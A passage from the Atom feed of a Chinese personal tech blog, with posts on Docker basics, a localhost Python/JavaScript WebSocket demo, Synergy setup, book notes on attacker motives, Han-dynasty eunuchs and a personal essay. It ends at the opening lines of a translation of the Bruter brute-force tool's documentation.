&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;提交一个你修改满意的容器到本地仓库生成相应的镜像&lt;/p&gt;
&lt;p&gt;5.常用的删除启动命令&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker start/stop/restart 容器名
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个不用多解释了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker rm 容器名
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;永久删除当前容器，但是前提是先stop了这个容器&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker rmi 镜像名
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;永久删除本地仓库中的镜像&lt;/p&gt;
&lt;p&gt;有了这几条命令，简单运行一个Docker就基本逻辑可以走顺了，当然，完整的命令请参照官方手册。&lt;/p&gt;
&lt;p&gt;还有几个关键命令会在下一节适合它们的地方登场。&lt;/p&gt;
&lt;h2 id=&quot;0x03-DIY&quot;&gt;&lt;a href=&quot;#0x03-DIY&quot; class=&quot;headerlink&quot; title=&quot;0x03 DIY&quot;&gt;&lt;/a&gt;0x03 DIY&lt;/h2&gt;&lt;p&gt;官方仓库中经过认证和未认证的项目有上千例（未具体求证），基本满足我们的应用部署需要，但是，有时候我们的有一些特殊需求时，可能就需要我们自己去编译一个镜像。&lt;/p&gt;
&lt;p&gt;当然，在介绍这部分之前，不得不提一个Dockeric（不保证有这么个词）的观点，Docker实现的容器应该是模块化的，所以每一个单独的容器最好只运行一个单独的进程，复杂的逻辑关系应该通过容器间的连接（–link）实现。向我在之前作为例子实现的wordpress其实就是一个反例，因为我在一个容器中同时放入了wordpress进程和mysql进程。所以，在DIY编译镜像时，尽量不要想使用vmware那样放太多的东西进去，小心鸡蛋砸在一个Container里~~。&lt;/p&gt;
&lt;p&gt;先入门基本指令，我以我的wordpress为例：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FROM ubuntu:14.04&lt;/p&gt;
&lt;p&gt;MAINTAINER xxxx &lt;a href=&quot;&amp;#109;&amp;#97;&amp;#105;&amp;#x6c;&amp;#x74;&amp;#111;&amp;#x3a;&amp;#120;&amp;#120;&amp;#x78;&amp;#x78;&amp;#x40;&amp;#120;&amp;#x78;&amp;#x78;&amp;#120;&quot;&gt;&amp;#120;&amp;#120;&amp;#x78;&amp;#x78;&amp;#x40;&amp;#120;&amp;#x78;&amp;#x78;&amp;#120;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ENV DEBIAN_FRONTEND noninteractive&lt;/p&gt;
&lt;p&gt;RUN apt-get update&lt;/p&gt;
&lt;p&gt;RUN apt-get -y upgrade&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;上手先W再E，FROM决定整个镜像的根基，你是打算用Ubuntu:14.04，Ubuntu:latset，CentOS还是什么其他的；MAINTAINER填写创建者信息；RUN是运行安装指令的基础；ENV设置环境变量&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;RUN apt-get -y install mysql-server mysql-client nginx php5-fpm php5-mysql php-apc pwgen python-setuptools curl git unzip&lt;/p&gt;
&lt;p&gt;RUN sed -i -e”s/^bind-address\s&lt;em&gt;=\s&lt;/em&gt;127.0.0.1/bind-address = 0.0.0.0/“ /etc/mysql/my.cnf&lt;br&gt;……&lt;/p&gt;
&lt;p&gt;ADD ./nginx-site.conf /etc/nginx/sites-available/default&lt;/p&gt;
&lt;p&gt;EXPOSE 3306&lt;/p&gt;
&lt;p&gt;EXPOSE 80&lt;/p&gt;
&lt;p&gt;VOLUME [“/var/lib/mysql”, “/usr/share/nginx/www”]&lt;/p&gt;
&lt;p&gt;CMD [“/bin/bash”, “/start.sh”]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;接着Q后面接R，ADD可以拷贝编译文件夹下的文件到镜像生成后的容器的相应文件夹下，EXPOSE则设置容器内部开启的端口，VOLUME负责挂载容器的文件，CMD是容器启动时执行的命令。而有多条CMD命令时，只执行最后的一行的CMD命令。&lt;/p&gt;
&lt;p&gt;当然这个文件只是说明，并不完整，完整的Dockerfile官网上有很多，我就不把我写的蹩脚file放到这里了。&lt;/p&gt;
&lt;p&gt;写好写指令后，保存为Dockerfile文件名，存在一个文件夹下，把相应的外部文件也都移到一起。&lt;/p&gt;
&lt;p&gt;在当前目录下执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker build -t 自己起的镜像名 .（这里还有一点，别看掉了）
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;程序就会按照你指定的安装流程进行相应的安装了。&lt;/p&gt;
&lt;h2 id=&quot;0x04-结语&quot;&gt;&lt;a href=&quot;#0x04-结语&quot; class=&quot;headerlink&quot; title=&quot;0x04 结语&quot;&gt;&lt;/a&gt;0x04 结语&lt;/h2&gt;&lt;p&gt;还是要说一下，这一篇是基于快速部署而写下的，内容肯定很浅薄，后面随着我对Docker学习的深入，应该还会有更进一步的经验总结和实际应用。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;套用介绍Docker的话，Docker是一个开源的引擎，可以创建一个轻量级的虚拟系统。由于它可以更加轻量级的实现虚拟机的作用，而且它自带很多很方便的监控运行系统状态的特性，所以受到大家的青睐。&lt;/p&gt;
&lt;p&gt;这篇博客旨在快速部署Docker，并不是对Docker进行深入研究，所以只会说说我在实际用Docker的过程中使用频次较高的实际指令，并不会详细介绍Docker基于Linux的底层实现原理和理论的东西，如果有错误请留言指正。&lt;/p&gt;
    
    </summary>
    
      <category term="Docker" scheme="http://phantom0301.github.io/categories/Docker/"/>
    
    
      <category term="Docker" scheme="http://phantom0301.github.io/tags/Docker/"/>
    
      <category term="入门" scheme="http://phantom0301.github.io/tags/%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>碎碎念</title>
    <link href="http://phantom0301.github.io/2016/07/04/whisper/"/>
    <id>http://phantom0301.github.io/2016/07/04/whisper/</id>
    <published>2016-07-04T10:49:17.000Z</published>
    <updated>2016-08-04T07:59:18.525Z</updated>
    
    <content type="html">&lt;p&gt;离别的氛围仿佛嵌进了空气一般，凝结在每一次的呼吸中。作为留守者，送别一个个远去的身影也仿佛成为了一种义务。有时明知道结果是离别，便不愿投入太多在一件事，一个人上，可是在还未分别的时光消磨下，也不知不觉的将他们在心中的地位不断提升，等到真正的离别到来时，才发现，哦，原来再向他们说分别已是如此的困难了。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;我们的生命就这样被分割成了一段段的相遇和离别，无论如何好像也摆脱不掉这样的轮回。在一整段的时光里看起来是那样的光鲜亮丽，可若是逢着连接整段时光的那些间隙，就难免让人有些失落和孤寂。毕竟，和一群人一起拥有了那么多的回忆，可是转瞬，就只剩下了你自己。&lt;/p&gt;
&lt;p&gt;终究一切的碎碎念和不好的情绪都要被自己消化掉，也渐渐强迫着用麻木的心态去对待这些离别，有时这被称为成长或是强大。当然，运动和其他的什么爱好可以作为占据内心的那些人或事离开时暂时的寄托，于是制订一项项学习，锻炼的计划也是远离不安孤寂不错的方法。&lt;/p&gt;
&lt;p&gt;其实做出某些选择时，前方未知的道路便已经渐渐露出了它延伸的方向。而我们能够做的，是决定以什么样的姿态去走完它。我总是希望自己最终不会败给生活中的苟且，希望即便有可能充满艰难，但依然在不易中有自己去选择的权利和自由。离开了一群人，我希望再相遇一些能让我不舍得人。结束了一段还尚且满意的生涯，我希望能够依然在接下去的时光中昂首前进。&lt;/p&gt;
&lt;p&gt;山已成隍，花已成尘，就在这变迁中不忘初心，追逐梦想。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;离别的氛围仿佛嵌进了空气一般，凝结在每一次的呼吸中。作为留守者，送别一个个远去的身影也仿佛成为了一种义务。有时明知道结果是离别，便不愿投入太多在一件事，一个人上，可是在还未分别的时光消磨下，也不知不觉的将他们在心中的地位不断提升，等到真正的离别到来时，才发现，哦，原来再向他们说分别已是如此的困难了。&lt;/p&gt;
    
    </summary>
    
      <category term="感悟" scheme="http://phantom0301.github.io/categories/%E6%84%9F%E6%82%9F/"/>
    
    
      <category term="感悟" scheme="http://phantom0301.github.io/tags/%E6%84%9F%E6%82%9F/"/>
    
  </entry>
  
  <entry>
    <title>闲谈-隐匿于网络中的入侵者</title>
    <link href="http://phantom0301.github.io/2016/05/18/invader/"/>
    <id>http://phantom0301.github.io/2016/05/18/invader/</id>
    <published>2016-05-18T12:05:53.000Z</published>
    <updated>2016-08-04T07:59:30.350Z</updated>
    
    <content type="html">&lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;p&gt;最近一段时间都在赶毕业设计了，觉得这期间被挖出来的那些影响比较大的漏洞都没有细致的去了解。不过论文之余，晚上睡前都在看Gregory Fell和Mike Barlow的《Who are the bad guys and what do they want？》，其中的第一部分就是书名的前半段。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;查过一些作者们的资料，似乎两位都不是专门研究信息安全的学者，所以书中大量的内容其实应该是来自作者们对于相关专家话语的记录，不过书中提到的很多观点都很有意思。&lt;/p&gt;
&lt;h2 id=&quot;0x01-白帽子还是黑帽子&quot;&gt;&lt;a href=&quot;#0x01-白帽子还是黑帽子&quot; class=&quot;headerlink&quot; title=&quot;0x01 白帽子还是黑帽子&quot;&gt;&lt;/a&gt;0x01 白帽子还是黑帽子&lt;/h2&gt;&lt;p&gt;我们经常会给一些hacker或是cracker（这两者是很不一样的）贴上一些标签，这是个白帽子平台，那是个黑帽子社区等等。但在文章中提到，有时候这些表面上的标签往往会让我们忽视某一群体在发现漏洞时的意图。&lt;/p&gt;
&lt;p&gt;那么在这种情况下，单纯的用“好人”或者“坏人”这样二进制意味浓厚的划分原则将会掩盖复杂的入侵意图。&lt;/p&gt;
&lt;p&gt;使用意图来对攻击进行定义或许能够让我们看到事情的本质。有些是出于研究意图的测试，那么这种行为往往带有友好的提醒；有些是出于个人情感，对于个人或者企业的一种打击报复；有些纯粹是出于贪婪，企图获取金钱或者其他利益；还有的可能是更复杂的情况，包括各国之间的窥探行为，或者只是偶然的一个点击等等，这些意图彼此之间并非泾渭分明的，它们往往能够在一定条件下进行转化。&lt;/p&gt;
&lt;p&gt;实际情况将会比上述这样简单的理论层面的分类更趋于多样化，大家也可以结合自身的经历来分析身边的“意图”，而不是仅仅靠扣上几个颜色的帽子就定义出谁是正义的谁是邪恶的。&lt;/p&gt;
&lt;h2 id=&quot;0x02-隐匿在网络中的人&quot;&gt;&lt;a href=&quot;#0x02-隐匿在网络中的人&quot; class=&quot;headerlink&quot; title=&quot;0x02 隐匿在网络中的人&quot;&gt;&lt;/a&gt;0x02 隐匿在网络中的人&lt;/h2&gt;&lt;p&gt;很多时候，我们的视线都汇聚到一个0day是怎么实现的、泄露出的数据体量到底有多少、哪个著名的企业在圣诞前夕又被DDOS威胁了等等这些十分吸引眼球的问题上，当然关注这些问题也是十分有意义的。不过，对于漏洞背后人的探索似乎很多时候没有引起足够多的关注。&lt;/p&gt;
&lt;p&gt;之前说过我们不应该简单的通过扣帽子的方式来给网络中的人们下定义，而是应该确定出那些驱使他们挖掘漏洞的因素。&lt;/p&gt;
&lt;p&gt;这里用了书中的一张表来对网络中的活动者下定义，&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160518204514.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这张表中划分出的类别算是补充了之前我的认知，他将网络中的活动者分成了五类，其实这些词不是太好准确的翻译，大概是内部人员、网络犯罪者、纯粹的黑客、恐怖分子和国家层面活动者，同样的，这些角色彼此之间也都是有关联的，那么按照我的想法，将图中几个角色的位置重新放置一下，我们其实可以做一个雷达图来对每一个信息安全事件背后的行动派进行角色判定，这样我们更能够清晰的认识到许多的网络活动的目的都不会那么的单一。&lt;/p&gt;
&lt;h2 id=&quot;0x03-是管理风险还是管理代码&quot;&gt;&lt;a href=&quot;#0x03-是管理风险还是管理代码&quot; class=&quot;headerlink&quot; title=&quot;0x03 是管理风险还是管理代码&quot;&gt;&lt;/a&gt;0x03 是管理风险还是管理代码&lt;/h2&gt;&lt;p&gt;另一个在书中提到的认知就是，信息安全的问题恐怕很难通过技术的进步去解决，无论你有多么先进的加密手段、无论你的机器学习能够模仿多么专业的安全研究人员，入侵者依然能够找到撕破防线的短板。当防线被攻破，最终，信息安全问题转化为了一个风险控制的问题。&lt;/p&gt;
&lt;p&gt;那么在这种情况下，采用更加合理的风险控制策略可能起到的作用会大于在代码中加入了一段安全的防护。当然，这两者并未站在对立的两个极端，我们显然可以通过彼此结合的手段来增强对资产的防护，当然，这里提到的是谁更应该放在主位的问题。&lt;/p&gt;
&lt;h2 id=&quot;0x04-结尾&quot;&gt;&lt;a href=&quot;#0x04-结尾&quot; class=&quot;headerlink&quot; title=&quot;0x04 结尾&quot;&gt;&lt;/a&gt;0x04 结尾&lt;/h2&gt;&lt;p&gt;就瞎扯到这里，好像后面和主题已经无关了，不管那么多了。&lt;/p&gt;
&lt;p&gt;有兴趣的可以阅读他们的原书。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;p&gt;最近一段时间都在赶毕业设计了，觉得这期间被挖出来的那些影响比较大的漏洞都没有细致的去了解。不过论文之余，晚上睡前都在看Gregory Fell和Mike Barlow的《Who are the bad guys and what do they want？》，其中的第一部分就是书名的前半段。&lt;/p&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://phantom0301.github.io/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="信息安全" scheme="http://phantom0301.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="闲谈" scheme="http://phantom0301.github.io/tags/%E9%97%B2%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>略读《通鉴》-汉纪-那些打破我们常规认识的宦官形象</title>
    <link href="http://phantom0301.github.io/2016/04/14/Han/"/>
    <id>http://phantom0301.github.io/2016/04/14/Han/</id>
    <published>2016-04-14T09:53:27.000Z</published>
    <updated>2016-08-04T07:59:07.707Z</updated>
    
    <content type="html">&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;闲暇时候随手翻阅了kindle中存的《资治通鉴》，本来只是随便阅读些史料，但是偶然中读到了黄门吕强其人其事，突然有了一个想法。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;平时我们在电视剧电影中经常看到宦官这一形象，在影视作品中，宦官时而被描写为武艺高强的大反派，时而被描写为性格诡谲的小人，也有一些作品中，宦官被赋予了是非分明的形象。那么，在真实的史料中，是否有像我们在影视剧中定位的贤良的宦官形象呢？&lt;/p&gt;
&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;主要阅读的是《通鉴》中汉纪光武以后到三国的部分，在此以前的西汉历史中，为了避免秦末赵高大权独揽情况的发生，内侍人员多使用士人，到了东汉，开始使用宦官。这一段史料中出现的第一个符合我们要求的形象是中常侍钩盾令郑众，钩盾令主要负责园苑游观之事。这时是汉和帝时期，由于外戚窦宪专政，朝臣莫不附之，但是郑众谨敏有心机，没有附和窦宪，最终与和帝一起定策诛宪。蔡伦大家都比较了解，这里就不赘述。&lt;/p&gt;
&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;接下来要说的就是中常侍孙程，这里背景简略说一下，当时的皇帝听信另一批宦官的谗言，废除皇太子为济阴王，后来皇后和外戚就立了北乡侯。没过多久，北乡侯就死了，这时之前的废太子还在，而皇后和进谗言的宦官希望立其他的外藩王为帝。这时孙程对废太子的侍从说到：“王以嫡统，本无失德。先帝用谗，遂至废黜。若北乡侯不起，相与共断江京、阎显，事无不成者。”最终，孙程和王康等十九人歃血为盟，斩除了外戚阎显以及同党，迎立了废太子登基。后来司隶校尉虞诩被宦官诬陷，要治死罪，孙程直接上殿，呵斥构陷者，被皇帝免官。后来，皇帝追念他的功勋，又把他召回了京师。&lt;/p&gt;
&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;第三个要说的是曹操名义上的祖父——曹腾。曹腾早年也是因为迎立汉桓帝有功，被封为费亭侯，升任大长秋，史书说他在宫中三十多年，没有显著地过失，并且能推荐贤人，陈留虞放、边韶、南阳延固、张温、弘农张奂、颍川堂谿典等都受到他的举荐。有一次，刺史种暠因为截获了外官打算贿赂曹腾的文书，于是弹劾曹腾，皇帝因为文书是从外地发来，便不予追究。后来曹腾还称赞种暠为能吏，种暠最后官至司徒，还说道他能做到这个职位，都是曹腾的功劳。&lt;/p&gt;
&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;最后要提到的就是中常侍吕强，这个人在《通鉴》里面描述颇多。说吕强从黄门升到中常侍，为人清忠奉公。汉灵帝时，封他为都乡侯，他辞让不肯接受，而且还上书劝说皇帝注意宦官为乱，后宫采女不应太多，河间不应该劳民伤财筑解渎馆，另外还上书说蔡邕对策切直，不应该治他的罪等等。后来黄巾之乱爆发，他又劝说皇帝赦免党人，诛杀贪官，考核地方官员。最终被同僚忌惮，吕强愤而自杀。&lt;/p&gt;
&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;在这一段所谓的宦官第一次当权的历史中，还有像良贺、丁肃、徐衍、赵祐等等和当时大批专权的宦官不同的形象，和影视剧中相比，让我们对于宦官形象有了不一样的认识。其实，从春秋战国到明末，不时的都能够在史料中看到这样一个群体打破大众对他们固有印象的事件，比如一些后来著名的治世能臣早年在宦官门下当食客，后经主人举荐得到君王赏识；一些人同时也是当时的书法家、匠人或者在经史学说上有所成就；还有一些人以忠于君王，同君王共赴危难而得到史家的青睐。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;闲暇时候随手翻阅了kindle中存的《资治通鉴》，本来只是随便阅读些史料，但是偶然中读到了黄门吕强其人其事，突然有了一个想法。&lt;/p&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://phantom0301.github.io/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="宦官" scheme="http://phantom0301.github.io/tags/%E5%AE%A6%E5%AE%98/"/>
    
      <category term="资治通鉴" scheme="http://phantom0301.github.io/tags/%E8%B5%84%E6%B2%BB%E9%80%9A%E9%89%B4/"/>
    
  </entry>
  
  <entry>
    <title>Js-Python实现socket通信</title>
    <link href="http://phantom0301.github.io/2016/04/12/Websocket/"/>
    <id>http://phantom0301.github.io/2016/04/12/Websocket/</id>
    <published>2016-04-12T07:51:55.000Z</published>
    <updated>2016-08-04T07:56:07.868Z</updated>
    
    <content type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Socket，一种开销很小的实现程序之间通信的方式。不同的编程语言几乎都有自己实现Socket的库和方法，建立在Socket基础上的许多通信协议也都广泛运用于各种框架中，之前在博客分享的Hpfeeds协议实际上就是建立在Socket的基础上。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;不同编程语言之间也经常使用Socket来传递消息，这样可以避免不同语言之间的嵌套调用。如题，这里我们需要在Python和Js之间实现一个消息传递。&lt;/p&gt;
&lt;h2 id=&quot;0x01-实现&quot;&gt;&lt;a href=&quot;#0x01-实现&quot; class=&quot;headerlink&quot; title=&quot;0x01 实现&quot;&gt;&lt;/a&gt;0x01 实现&lt;/h2&gt;&lt;p&gt;最初查找资料的时候，许多博客中都提到了说，Js本身是不能够实现Socket的，而常用的方法实际上是利用Flash的Socket来进行通信，然后通过Js获得Flash的响应事件来传递数据。为此有一个专门的Js库叫Aflax。&lt;/p&gt;
&lt;p&gt;同时，另一种更新的方法是使用Html5协议中的WebSocket来实现浏览器和服务器的通信。&lt;/p&gt;
&lt;p&gt;关于WebSocket的具体协议就不在这里详述了，毕竟我也没有认真去看。&lt;/p&gt;
&lt;p&gt;实现WebSocket通信的方法也有很多种，网上容易查到的是使用Node.js的实现方法&lt;br&gt;&lt;a href=&quot;https://github.com/SushisMakis/WebSocket&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/SushisMakis/WebSocket&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里，作者提供个一个Python实现的服务器&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import struct
import SocketServer
from base64 import b64encode, b64decode
from hashlib import sha1
from mimetools import Message
from StringIO import StringIO

clients = [];
class WebSocketsHandler(SocketServer.StreamRequestHandler):
    magic = &amp;apos;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&amp;apos;

    def setup(self):
        SocketServer.StreamRequestHandler.setup(self)
        print &amp;quot;connection established&amp;quot;, self.client_address
        self.handshake_done = False

    def handle(self):
        while True:
            if not self.handshake_done:
                self.handshake()
                clients.append(self)
            else:
                try:
                    self.read_next_message()
                except:
                    self.request.close()
                    return

    def read_next_message(self):
        length = ord(self.rfile.read(2)[1]) &amp;amp; 127
        if length == 126:
            length = struct.unpack(&amp;quot;&amp;gt;H&amp;quot;, self.rfile.read(2))[0]
        elif length == 127:
            length = struct.unpack(&amp;quot;&amp;gt;Q&amp;quot;, self.rfile.read(8))[0]
        masks = [ord(byte) for byte in self.rfile.read(4)]
        decoded = &amp;quot;&amp;quot;
        for char in self.rfile.read(length):
            decoded += chr(ord(char) ^ masks[len(decoded) % 4])
        self.on_message(decoded)

    def send_message(self, data, fin=True, opcode=1, masking_key=False):
        header = struct.pack(&amp;apos;!B&amp;apos;, ((fin &amp;lt;&amp;lt; 7) | (0 &amp;lt;&amp;lt; 6)| (0 &amp;lt;&amp;lt; 5)| (0 &amp;lt;&amp;lt; 4)| opcode))
        if masking_key:
            mask_bit = 1 &amp;lt;&amp;lt; 7
        else:
            mask_bit = 0
        length = len(data)
        if length &amp;lt; 126:
            header += struct.pack(&amp;apos;!B&amp;apos;, (mask_bit | length))
        elif length &amp;lt; (1 &amp;lt;&amp;lt; 16):
            header += struct.pack(&amp;apos;!B&amp;apos;, (mask_bit | 126)) + struct.pack(&amp;apos;!H&amp;apos;, length)
        elif length &amp;lt; (1 &amp;lt;&amp;lt; 63):
            header += struct.pack(&amp;apos;!B&amp;apos;, (mask_bit | 127)) + struct.pack(&amp;apos;!Q&amp;apos;, length)
        body = data
        self.request.send(bytes(header + body))

    def handshake(self):
        data = self.request.recv(1024).strip()
        headers = Message(StringIO(data.split(&amp;apos;\r\n&amp;apos;, 1)[1]))
        if headers.get(&amp;quot;Upgrade&amp;quot;, None) != &amp;quot;websocket&amp;quot;:
            return
        print &amp;apos;Handshaking...&amp;apos;
        key = headers[&amp;apos;Sec-WebSocket-Key&amp;apos;]
        digest = b64encode(sha1(key + self.magic).hexdigest().decode(&amp;apos;hex&amp;apos;))
        response = &amp;apos;HTTP/1.1 101 Switching Protocols\r\n&amp;apos;+&amp;apos;Upgrade: websocket\r\n&amp;apos;+&amp;apos;Connection: Upgrade\r\n&amp;apos;
        response += &amp;apos;Sec-WebSocket-Accept: %s\r\n\r\n&amp;apos; % digest
        self.handshake_done = self.request.send(response)

    def on_message(self, message):
        text = b64decode(message)
        print text
        for client in clients:
            if client.client_address != self.client_address:
                client.send_message(b64encode(text))

class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    pass

if __name__ == &amp;quot;__main__&amp;quot;:
    server = ThreadedTCPServer((&amp;quot;localhost&amp;quot;, 9999), WebSocketsHandler)
    server.serve_forever()   
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们使用其中的这段代码作为服务器。&lt;/p&gt;
&lt;p&gt;用这段Ps作为浏览器端的接收Pemo&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// SmWebSocket(url,port,b64encode,fonMessage, ...)
var smWs = new SmWebSocket(&amp;quot;localhost&amp;quot;,9999,true,handle_recv);
smWs.open();
var myDictObjectProtocol = {&amp;quot;p1top2&amp;quot;: handle_transit}; // {id : function, ... }
var p = new Protocol(myDictObjectProtocol,&amp;quot;|&amp;quot;);

function handle_recv(event)
{
    var data = event.data;
    data = Base64.decode(data);
    alert(data);
    p.handleMessage(data);
}

function handle_transit(mess){
    document.getElementById(&amp;quot;data_in&amp;quot;).innerText = mess;
} 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里作者只实现了浏览器发送到服务器以及浏览器之间的交互，所以现在我们还缺一个Python发送的程序，我最初希望直接使用Pyhton的Socket来实现一个端口发送，但是最后发现每次发送的程序都被服务器拒绝了，所以我又找到了一个Python实现的WebSocket库，当然这个和Pip下载的WebSocket库不同。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/liris/websocket-client&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/liris/websocket-client&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我修改了其中编码的部分，以和之前的程序适应&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from __future__ import print_function
import websocket
import base64

if __name__ == &amp;quot;__main__&amp;quot;:
    #websocket.enableTrace(True)
    ws = websocket.create_connection(&amp;quot;ws://localhost:9999&amp;quot;)
    data = &amp;quot;p1top2|Hello World&amp;quot;
    data = base64.b64encode(data)
    ws.send(data)
    ws.close()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;要求的库直接Clone上面项目里的即可，这样，我们就实现了通过Python和Js进行Socket通信的程序。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Socket，一种开销很小的实现程序之间通信的方式。不同的编程语言几乎都有自己实现Socket的库和方法，建立在Socket基础上的许多通信协议也都广泛运用于各种框架中，之前在博客分享的Hpfeeds协议实际上就是建立在Socket的基础上。&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="http://phantom0301.github.io/categories/python/"/>
    
    
      <category term="JS" scheme="http://phantom0301.github.io/tags/JS/"/>
    
      <category term="Python" scheme="http://phantom0301.github.io/tags/Python/"/>
    
      <category term="Socket" scheme="http://phantom0301.github.io/tags/Socket/"/>
    
  </entry>
  
  <entry>
    <title>效率利器-Synergy</title>
    <link href="http://phantom0301.github.io/2016/04/06/Synergy/"/>
    <id>http://phantom0301.github.io/2016/04/06/Synergy/</id>
    <published>2016-04-06T06:52:16.000Z</published>
    <updated>2016-08-04T07:59:46.859Z</updated>
    
    <content type="html">&lt;p&gt;最近要同时操作两台机器，一台是win的，一台是linux的。无论是准备两套键鼠，还是用SSH远程都不够方便。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;在网上找到了这个软件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/sy1.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;发现很好的解决了我的需求，而且它不仅可以让两个系统的主机共用一套键鼠，还可以实现两台主机上的简单分屏，虽然不能直接从一个屏幕拖到另一个屏幕，但是鼠标可以无缝连接滑动，而且共享剪贴板。&lt;/p&gt;
&lt;p&gt;设置也很简单&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/sy2.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在两台电脑上分别安装Synergy，并且在同一个局域网中。一台作为server主机（键鼠物理连接的电脑），一台作为client从机。&lt;/p&gt;
&lt;p&gt;在主机上进行配置，&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/sy3.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在这里选择分屏的位置。&lt;/p&gt;
&lt;p&gt;再在 Advanced server settings设置主从机切换的快捷键&lt;/p&gt;
&lt;p&gt;分别启动，软件就会自动去检测主从机。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;最近要同时操作两台机器，一台是win的，一台是linux的。无论是准备两套键鼠，还是用SSH远程都不够方便。&lt;/p&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://phantom0301.github.io/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>爆破工具Bruter文档翻译</title>
    <link href="http://phantom0301.github.io/2016/03/25/Bruter/"/>
    <id>http://phantom0301.github.io/2016/03/25/Bruter/</id>
    <published>2016-03-25T01:54:43.000Z</published>
    <updated>2016-08-04T07:58:14.828Z</updated>
    
    <content type="html">&lt;p&gt;说到爆破神器，kali中的msf爆破插件、hydra、medusa都足够强大，这里推荐一款win环境使用的爆破测试工具，bruter。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;仅仅翻译一下官方文档，bruter的所有说明文件都在目录的doc中。&lt;/p&gt;
